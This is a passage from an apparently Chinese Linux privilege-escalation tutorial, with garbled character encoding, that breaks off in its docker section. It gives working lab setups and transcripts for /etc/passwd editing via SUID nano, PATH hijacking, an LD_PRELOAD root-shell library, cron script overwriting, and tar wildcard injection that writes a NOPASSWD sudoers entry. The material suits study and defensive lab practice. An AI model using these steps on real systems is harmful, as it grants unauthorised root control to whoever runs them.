class="line-number"></div></div></div><ul><li>é€šè¿‡nanoç¼–è¾‘/etc/passwdæ–‡ä»¶ï¼Œå°†æ™®é€šç”¨æˆ·ä¿®æ”¹ä¸ºrootæƒé™ç”¨æˆ·</li><li>æŒ‰ç…§è¿™ç§æ€è·¯ä¹Ÿå¯ä»¥ä¿®æ”¹/etc/sudoersæ–‡ä»¶</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>ææƒè¿‡ç¨‹ï¼š
[test@localhost shagou]$ whoami
test
1.å°†1001:1001ä¿®æ”¹ä¸º0:0
[test@localhost shagou]$ ./nano -p /etc/passwd
[test@localhost shagou]$ whoami
whoamiï¼šæ— æ³•æ‰¾åˆ°ç”¨æˆ·ID ä¸º1001 çš„ç”¨æˆ·å
[test@localhost shagou]$ su test
å¯†ç ï¼š
[root@localhost shagou]# whoami
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="pathç¯å¢ƒå˜é‡ææƒ" tabindex="-1"><a class="header-anchor" href="#pathç¯å¢ƒå˜é‡ææƒ" aria-hidden="true">#</a> PATHç¯å¢ƒå˜é‡ææƒ</h4><ul><li>Linuxä¸­çš„PATHæ˜¯ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒåˆ¶å®šäº†å¯æ‰§è¡Œç¨‹åºæ‰€åœ¨çš„ç›®å½•ï¼Œä¾‹å¦‚binå’Œsbinç›®å½•ã€‚å½“æˆ‘ä»¬åœ¨ç»ˆç«¯è¿è¡Œä¸€ä¸ªç›®å½•æ—¶ï¼Œç³»ç»Ÿå°±ä¼šæ ¹æ®PATHæ¥æŸ¥æ‰¾ç›¸å…³çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li><li>å¯ä»¥é€šè¿‡envå‘½ä»¤åˆ—å‡ºæ‰€æœ‰çš„ç¯å¢ƒå˜é‡ï¼Œç„¶åæ‰¾åˆ°PATHï¼Œæˆ–è€…grepè¿›è¡Œç»“æœç­›é€‰ï¼Œæˆ–è€…echoå‡º$PATHå€¼ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>[test@localhost shagou]$ env | grep &quot;^PATH&quot;
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
[test@localhost shagou]$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="psç»“åˆpathææƒ" tabindex="-1"><a class="header-anchor" href="#psç»“åˆpathææƒ" aria-hidden="true">#</a> psç»“åˆPATHææƒ</h5><ul><li>è¿™ç§æƒ…å†µé€‚ç”¨äºï¼šç»™æ™®é€šç”¨æˆ·åˆ†é…äº†ä¸ªå¯æ‰§è¡Œç¨‹åºä¸”è¯¥ç¨‹åºæœ‰suidæƒé™ï¼Œè€Œä¸”æˆ‘ä»¬åˆçŸ¥é“è¯¥ç¨‹åºè°ƒç”¨äº†å“ªäº›å‘½ä»¤ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç»“åˆPATHæ¥è¿›è¡Œææƒã€‚</li><li>pså‘½ä»¤åªæ˜¯ä¸ªä¾‹å­ï¼Œå¦‚æœé‡åˆ°idï¼Œwhoamiï¼Œcatï¼Œvimç­‰ç­‰ï¼Œéƒ½æ˜¯å¯ä»¥çš„ï¼Œåªéœ€ä¿®æ”¹tmpç›®å½•ä¸‹çš„æ–‡ä»¶åå³å¯ã€‚</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ç¯å¢ƒæ­å»ºï¼š
<span class="token number">1</span>.ç®¡ç†å‘˜ç”Ÿæˆä¸€ä¸ªæ‰§è¡Œpså‘½ä»¤çš„ç¨‹åº
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># vim  psml.c</span>
<span class="token comment">#include&lt;unistd.h&gt;</span>
void <span class="token function-name function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        setuid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        setgid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        system<span class="token punctuation">(</span><span class="token string">&quot;ps&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># gcc psml.c -o psml</span>

<span class="token number">2</span>.æ·»åŠ SUIDæƒé™ã€‚å¹¶è®©æ™®é€šç”¨æˆ·æœ‰æ‰§è¡Œæƒã€‚
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># chmod +s psml</span>
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># chmod 777 psml</span>

ææƒè¿‡ç¨‹ï¼š
<span class="token number">1</span>.åœ¨tmpç›®å½•ä¸‹ï¼Œå°†/bin/bashå†™è¿›ä¸€ä¸ªå«psçš„æ–‡ä»¶ä¸­ï¼Œç„¶åèµ‹äºˆæ‰§è¡Œæƒé™ã€‚æˆ–è€…å°†/bin/bashå¤åˆ¶ï¼Œç„¶åå°†bashæ”¹åæˆpsã€‚åˆæˆ–è€…ä½¿ç”¨ç¬¦å·é“¾æ¥ï¼Œä¸è¿‡åœ¨tmpç›®å½•ä¸å¯ä»¥ï¼Œè¦åœ¨å…¶ä»–ç›®å½•ã€‚
<span class="token punctuation">[</span>test@localhost tmp<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token string">&quot;/bin/bash&quot;</span> <span class="token operator">&gt;</span> <span class="token function">ps</span>
<span class="token punctuation">[</span>test@localhost tmp<span class="token punctuation">]</span>$ <span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">ps</span>
<span class="token number">2</span>.ä¿®æ”¹ç¯å¢ƒå˜é‡ï¼Œå°†tmpç›®å½•åŠ å…¥ç¯å¢ƒå˜é‡ä¸­ã€‚
<span class="token punctuation">[</span>test@localhost tmp<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
<span class="token punctuation">[</span>test@localhost tmp<span class="token punctuation">]</span>$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:<span class="token environment constant">$PATH</span>
<span class="token punctuation">[</span>test@localhost tmp<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
<span class="token number">3</span>.æ‰§è¡Œpsmlï¼Œå°±ä¼šé€šè¿‡psmlä¸­æ‰§è¡Œpså‘½ä»¤ï¼Œpsé€šè¿‡æŸ¥è¯¢ç¯å¢ƒå˜é‡ï¼Œæ‰¾åˆ°/tmpï¼Œæ‰§è¡Œ/tmpä¸­çš„psã€‚
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ ./psml
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

<span class="token number">1</span>.ä½¿ç”¨ç¬¦å·é“¾æ¥æ–¹å¼
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ <span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/bash ./ps
root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># ls</span>
<span class="token function">bash</span>  <span class="token function">nano</span>  <span class="token function">ps</span>  psml  psml.c  pspath
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>.:<span class="token environment constant">$PATH</span>
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ <span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>
.:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin
<span class="token punctuation">[</span>test@localhost shagou<span class="token punctuation">]</span>$ ./psml
<span class="token punctuation">[</span>root@localhost shagou<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="ld-preloadé¢„å…ˆåŠ è½½ææƒ" tabindex="-1"><a class="header-anchor" href="#ld-preloadé¢„å…ˆåŠ è½½ææƒ" aria-hidden="true">#</a> LD_PRELOADé¢„å…ˆåŠ è½½ææƒ</h4><ul><li>LD_PRELOADæ˜¯Linuxçš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç¨‹åºè¿è¡Œæ—¶éƒ½ä¼šåŠ è½½ä¸€äº›soæ–‡ä»¶ï¼Œç±»ä¼¼äºwindowsä¸‹ç¨‹åºåŠ è½½dllï¼Œè€ŒLD_PRELOADå¯ä»¥æŒ‡å®šç¨‹åºè¿è¡Œå‰åŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚</li></ul><h5 id="find-2" tabindex="-1"><a class="header-anchor" href="#find-2" aria-hidden="true">#</a> find</h5><ul><li>å½“æˆ‘ä»¬æœ‰ä¸€ä¸ªfindçš„sudoæƒï¼Œä¸”env_keepä¸­å®šä¹‰äº†LD_PRELOADï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å®šä¹‰ä¸€ä¸ªæ¶æ„çš„soæ–‡ä»¶ï¼Œç„¶åsudoè¿è¡Œfindçš„æ—¶å€™æŒ‡å®šLD_PRELOADæ¥åŠ è½½æˆ‘ä»¬è‡ªå·±çš„soæ–‡ä»¶ï¼Œé‚£ä¹ˆå°±å¯ä»¥å®ç°ææƒã€‚</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ç¯å¢ƒæ­å»ºï¼š
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># vim /etc/sudoers</span>
Defaults        env_keep <span class="token operator">+=</span> LD_PRELOAD <span class="token comment">#ç¯å¢ƒå˜é‡ä¸å—ç”¨æˆ·åˆ‡æ¢å½±å“ã€‚</span>
<span class="token builtin class-name">test</span>    <span class="token assign-left variable">ALL</span><span class="token operator">=</span><span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD:/usr/bin/find <span class="token comment">#å…å¯†ä»¥rootæƒé™ä½¿ç”¨findã€‚</span>

ææƒæµç¨‹ï¼š
<span class="token number">1</span>.å‡†å¤‡ä¸€ä¸ªæ¶æ„çš„soæ–‡ä»¶
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">vim</span> shell.c
<span class="token comment">#include &lt;stdio.h&gt;</span>
<span class="token comment">#include &lt;sys/types.h&gt;</span>
<span class="token comment">#include &lt;stdlib.h&gt;</span>
void <span class="token function-name function">_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
        unsetenv<span class="token punctuation">(</span><span class="token string">&quot;LD_PRELOAD&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        setgid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        setuid<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        system<span class="token punctuation">(</span><span class="token string">&quot;/bin/bash&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">#-fPIC -sharedå‚æ•°ï¼šåŠ¨æ€ç¼–è¾‘å…±äº«åº“ï¼Œå¯ä»¥è¿›è¡Œå…¬å…±è°ƒç”¨ã€‚</span>
<span class="token comment">#-nostartfileså‚æ•°ï¼šè¡¨ç¤ºè¯¥åº“è¿è¡Œä¸ä¼šè°ƒç”¨ç³»ç»Ÿçš„å…¶ä»–åº“ï¼Œé¿å…å½±å“è‡ªå·±çš„ç¨‹åºæ‰§è¡Œã€‚</span>
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ gcc shell.c <span class="token parameter variable">-fPIC</span> <span class="token parameter variable">-shared</span> <span class="token parameter variable">-o</span> shell.so <span class="token parameter variable">-nostartfiles</span>

<span class="token number">2</span>.èµ‹äºˆæ‰§è¡Œæƒé™ï¼Œå¹¶ä½¿ç”¨sudoæ‰§è¡Œ
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">chmod</span> +x shell.so
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token assign-left variable">LD_PRELOAD</span><span class="token operator">=</span>./shell.so <span class="token function">find</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="cronææƒ" tabindex="-1"><a class="header-anchor" href="#cronææƒ" aria-hidden="true">#</a> Cronææƒ</h4><img src="/assets/2-b53b5df3.jpg"><h5 id="å®šæ—¶ä»»åŠ¡æ–‡ä»¶ä¿®æ”¹-è¦†ç›–" tabindex="-1"><a class="header-anchor" href="#å®šæ—¶ä»»åŠ¡æ–‡ä»¶ä¿®æ”¹-è¦†ç›–" aria-hidden="true">#</a> å®šæ—¶ä»»åŠ¡æ–‡ä»¶ä¿®æ”¹/è¦†ç›–</h5><ul><li>å‡è®¾å­˜åœ¨ä¸€ä¸ªé€šè¿‡å®šæ—¶ä»»åŠ¡å»æ‰§è¡Œçš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥å»ä¿®æ”¹æ–‡ä»¶å†…å®¹å®ç°ææƒã€‚</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ç¯å¢ƒæ­å»º
<span class="token number">1</span>.ç¼–å†™ä¸€ä¸ªå®šæ—¶æ¸…ç†æ–‡ä»¶çš„pyæ–‡ä»¶ï¼Œèµ‹äºˆæ‰§è¡Œæƒé™ã€‚
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># vim clear.py</span>
<span class="token comment">#! /usr/bin/env python3</span>
<span class="token function">import</span> os
<span class="token function">import</span> sys
try:
        os.system<span class="token punctuation">(</span><span class="token string">&#39;rm -rf /tmp/shagou/*&#39;</span><span class="token punctuation">)</span>
except:
        sys.exit<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># chmod +x clear.py</span>

<span class="token number">2</span>.é…ç½®å®šæ—¶ä»»åŠ¡ï¼Œæ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€‚
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># vim /etc/crontab</span>
*/1 * * * * root /home/test/clear.py

ææƒè¿‡ç¨‹ï¼š
<span class="token number">1</span>.ç›´æ¥ä¿®æ”¹è„šæœ¬æ–‡ä»¶
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ <span class="token function">cat</span> clear.py
<span class="token comment">#! /usr/bin/env python3</span>
<span class="token function">import</span> os
<span class="token function">import</span> sys
try:
        os.system<span class="token punctuation">(</span><span class="token string">&#39;chmod +s /usr/bin/bash&#39;</span><span class="token punctuation">)</span>
except:
        sys.exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token number">2</span>.ç­‰å¾…å®šæ—¶ä»»åŠ¡æ‰§è¡Œ
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ll /usr/bin/bash
-rwxr-xr-x. <span class="token number">1</span> root root <span class="token number">964536</span> <span class="token number">4</span>æœˆ   <span class="token number">1</span> <span class="token number">2020</span> /usr/bin/bash
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ ll /usr/bin/bash	<span class="token comment">#æŸ¥çœ‹åˆ°æœ‰suidæƒé™ï¼ŒåŠ ä¸Š-pæ‰§è¡Œ</span>
-rwsr-sr-x. <span class="token number">1</span> root root <span class="token number">964536</span> <span class="token number">4</span>æœˆ   <span class="token number">1</span> <span class="token number">2020</span> /usr/bin/bash
<span class="token punctuation">[</span>test@localhost ~<span class="token punctuation">]</span>$ /usr/bin/bash <span class="token parameter variable">-p</span>
bash-4.2<span class="token comment"># whoami</span>
root
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h5 id="é€šé…ç¬¦ææƒ" tabindex="-1"><a class="header-anchor" href="#é€šé…ç¬¦ææƒ" aria-hidden="true">#</a> é€šé…ç¬¦ææƒ</h5><ul><li>å‡è®¾æœ‰ä¸ªå®šæ—¶ä»»åŠ¡æ˜¯é€šè¿‡tarå®šæ—¶å‹ç¼©æŸæ–‡ä»¶çš„å†…å®¹ï¼Œå¦‚æœå®šæ—¶ä»»åŠ¡è„šæœ¬ä¸­tarå‹ç¼©ä½¿ç”¨é€šé…ç¬¦ï¼ˆ*ï¼Œå½“å‰ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼‰ï¼Œç”±äºæ–‡ä»¶åå¦‚æœå’Œå‘½ä»¤å‚æ•°ç›¸åŒçš„è¯ä¼šé‚£ä¹ˆå°±ä¼šæ‰§è¡Œå‘½ä»¤å‚æ•°ï¼Œè€Œä¸å»æ‰§è¡Œè¯¥æ–‡ä»¶ã€‚</li><li>åœ¨tarå‘½ä»¤ä¸­æœ‰ä¸€ä¸ªcheckpoinå‚æ•°ï¼Œå¦‚--checkpoint=1è¡¨ç¤ºå‹ç¼©è¿‡ç¨‹ä¸­æ¯å‹ç¼©ä¸€ä¸ªæ–‡ä»¶å°±å»æ‰§è¡Œä¸€ä¸ªæ£€æŸ¥æ“ä½œã€‚è€Œè¿™ä¸ªæ£€æŸ¥æ“ä½œå‚æ•°æ˜¯--checkpoint-action=exec=ï¼Œåé¢å¯ä»¥è·Ÿè¦æ‰§è¡Œçš„å‘½ä»¤</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ç¯å¢ƒæ­å»º
<span class="token number">1</span>.é…ç½®å®šæ—¶ä»»åŠ¡æ–‡ä»¶å¹¶èµ‹äºˆæ‰§è¡Œæƒé™ã€‚è¯¥è„šæœ¬çš„æ„æ€å‹ç¼©/var/www/html/è¿™ä¸ªç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åˆ°/home/test/ï¼Œå¹¶ä¸”å‹ç¼©åŒ…çš„åå­—ä¸ºhtml.tarã€‚
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># vim backup.sh</span>
<span class="token comment">#!/bin/bash</span>
<span class="token builtin class-name">cd</span> /var/www/html/
<span class="token function">tar</span> cf /home/test/html.tar *
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># chmod +x backup.sh</span>

<span class="token number">2</span>.ç¼–è¾‘å®šæ—¶ä»»åŠ¡
<span class="token punctuation">[</span>root@localhost test<span class="token punctuation">]</span><span class="token comment"># vim /etc/crontab</span>
*/1 * * * * root /home/test/backup.sh

ææƒè¿‡ç¨‹
<span class="token number">1</span>.åœ¨è¦è¢«å‹ç¼©çš„ç›®å½•ä¸‹æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œåˆ›å»ºè¿™äº›æ–‡ä»¶ã€‚
<span class="token punctuation">[</span>test@localhost html<span class="token punctuation">]</span>$ <span class="token builtin class-name">pwd</span>
/var/www/html
<span class="token builtin class-name">echo</span> <span class="token string">&#39;echo &quot;test ALL=(root) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#39;</span> <span class="token operator">&gt;</span> test.sh
<span class="token builtin class-name">echo</span> <span class="token string">&quot;&quot;</span> <span class="token operator">&gt;</span> <span class="token parameter variable">--checkpoint</span><span class="token operator">=</span><span class="token number">1</span>
<span class="token builtin class-name">echo</span> <span class="token string">&quot;&quot;</span> <span class="token operator">&gt;</span> <span class="token string">&quot;--checkpoint-action=exec=bash test.sh&quot;</span>
<span class="token punctuation">[</span>test@localhost html<span class="token punctuation">]</span>$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
æ€»ç”¨é‡ <span class="token number">12</span>
drwxr-xr-x. <span class="token number">3</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span> <span class="token number">101</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> <span class="token number">17</span>:23 <span class="token builtin class-name">.</span>
drwxr-xr-x. <span class="token number">4</span> root root  <span class="token number">34</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> <span class="token number">17</span>:22 <span class="token punctuation">..</span>
-rw-rw-r--. <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span>   <span class="token number">1</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> <span class="token number">17</span>:23 <span class="token parameter variable">--checkpoint</span><span class="token operator">=</span><span class="token number">1</span>
-rw-rw-r--. <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span>   <span class="token number">1</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> <span class="token number">17</span>:23 --checkpoint-action<span class="token operator">=</span>exec<span class="token operator">=</span>bash test.sh
drwxr-xr-x. <span class="token number">2</span> root root   <span class="token number">6</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> <span class="token number">17</span>:22 dasda
-rw-rw-r--. <span class="token number">1</span> <span class="token builtin class-name">test</span> <span class="token builtin class-name">test</span>  <span class="token number">52</span> <span class="token number">3</span>æœˆ  <span class="token number">12</span> <span class="token number">17</span>:23 test.sh

<span class="token number">2</span>.ç­‰å¾…è®¡åˆ’ä»»åŠ¡æ‰§è¡Œå®Œæ¯•
<span class="token punctuation">[</span>test@localhost html<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
åŒ¹é… %2<span class="token variable">$s</span> ä¸Š %1<span class="token variable">$s</span> çš„é»˜è®¤æ¡ç›®ï¼š
    <span class="token operator">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, <span class="token assign-left variable">env_keep</span><span class="token operator">=</span><span class="token string">&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;</span>,
    <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span><span class="token string">&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;</span>,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin, <span class="token assign-left variable">env_keep</span><span class="token operator">+=</span>LD_PRELOAD

ç”¨æˆ· <span class="token builtin class-name">test</span> å¯ä»¥åœ¨ localhost ä¸Šè¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š
    <span class="token punctuation">(</span>root<span class="token punctuation">)</span> NOPASSWD: ALL

<span class="token punctuation">[</span>test@localhost html<span class="token punctuation">]</span>$ <span class="token function">sudo</span> <span class="token function">bash</span>
<span class="token punctuation">[</span>root@localhost html<span class="token punctuation">]</span><span class="token comment"># whoami</span>
root

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="dockerææƒ" tabindex="-1"><a class="header-anchor" href="#dockerææƒ" aria-hidden="true">#</a> dockerææƒ</h4><ul><li>åœ¨dockerä¸­ï¼Œdockerç»„ä¸­çš„ç”¨æˆ·å¯ä»¥è®¿é—®rootæƒé™çš„æ–‡ä»¶ã€‚</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>ç¯å¢ƒæ­å»º
<span class="token number">1</span>.é¦–å…ˆï¼Œrooté…ç½®ä¸å½“ï¼Œå°†ä¸€ä¸ªæ™®é€šè´¦æˆ·æ·»åŠ åˆ°äº†dockerç»„ä¸­ã€‚
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># usermod -G docker test</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># id test</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span> ç»„<span class="token operator">=</span><span class="token number">1001</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span>,982<span class="token punctuation">(</span>docker<span class="token punctuation">)</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># newgrp docker #ç”¨æˆ·ç¯å¢ƒé‡æ–°åˆå§‹åŒ–</span>
<span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment"># cat /etc/group | grep test</span>
docker:x:982:test
test:x:1001:
<span class="token punctuation">[</span>test@localhost root<span class="token punctuation">]</span>$ <span class="token function">groups</span> <span class="token builtin class-name">test</span>
<span class="token builtin class-name">test</span> <span class="token builtin class-name">:</span> <span class="token builtin class-name">test</span> <span class="token function">docker</span>

ææƒè¿‡ç¨‹
<span class="token number">1</span>.è¿è¡Œalpineé•œåƒï¼Œ-vä¸ºå°†å®¿ä¸»æœºçš„/rootç›®å½•æŒ‚è½½åˆ°é•œåƒçš„/mntç›®å½•ä¸‹ï¼Œ-iä¸ºä¿æŒæ‰“å¼€çŠ¶æ€ï¼Œ-tä¸ºåˆ†é…ä¸€ä¸ªttyç»ˆç«¯
